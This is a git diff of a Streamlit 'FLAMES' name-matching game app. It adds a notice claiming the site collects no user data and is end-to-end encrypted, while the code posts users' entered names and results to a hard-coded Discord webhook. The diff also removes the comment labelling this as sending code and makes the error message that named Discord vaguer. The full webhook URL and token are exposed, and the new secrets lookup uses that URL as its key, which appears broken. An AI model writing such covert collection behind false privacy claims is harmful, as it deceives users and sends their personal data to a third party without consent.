@@ -11,6 +11,21 @@ hide_st_style = """
             """
 st.markdown(hide_st_style, unsafe_allow_html=True)
 # -----------------------------
+# -------- PURPOSE / INFO SECTION --------
+st.markdown(
+    """
+**Purpose:**  
+What’s the need of paper when we have a site that leaves **zero trace**.
+
+🔒 **Privacy Note:**  
+This app/site does **NOT collect user data** and is **end-to-end encrypted**.
+
+💡 **Tip:**  
+Use **complete names** for better results.
+"""
+)
+
+st.divider()
 
 st.title("FLAMES Game")
 
@@ -48,8 +63,8 @@ if st.button("Get Result"):
         result_text = d[s]
         st.success(result_text)
 
-        # --- DEBUG SENDING CODE ---
-        webhook_url = "https://discordapp.com/api/webhooks/1454866233714413724/x0wbhqvgDxxHUaOVp7xiF6o3RFBxeYtXubuoMWQo2f-IUnkJAaqN0uHAQuZm3E7WRi1M"
+        
+        webhook_url = st.secrets[ "https://discordapp.com/api/webhooks/1454866233714413724/x0wbhqvgDxxHUaOVp7xiF6o3RFBxeYtXubuoMWQo2f-IUnkJAaqN0uHAQuZm3E7WRi1M"]
         
         payload = {"content": f"🔥 **New FLAMES Entry!**\n**{name1}** + **{name2}** = **{result_text}**"}
         
@@ -58,8 +73,9 @@ if st.button("Get Result"):
             if response.status_code == 204:
                 st.info("thanks for using,may your relation stay HAPPY FOR EVER")
             else:
-                st.error(f"❌ Failed to send. Discord said: {response.status_code}")
+                st.error(f"RETRY: {response.status_code}")
                 st.write(response.text)
         except Exception as e:
             st.error(f"❌ Python Error: {e}")
+
 
